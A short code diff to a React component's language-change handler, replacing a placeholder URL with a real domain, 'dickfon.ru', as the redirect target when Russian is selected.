@@ -29,7 +29,7 @@ const Index = () => {
 
   const handleLanguageChange = (newLang: Language) => {
     if (newLang === "ru") {
-      window.location.href = "https://ru.example.com";
+      window.location.href = "https://dickfon.ru";
       return;
     }
     setLang(newLang);
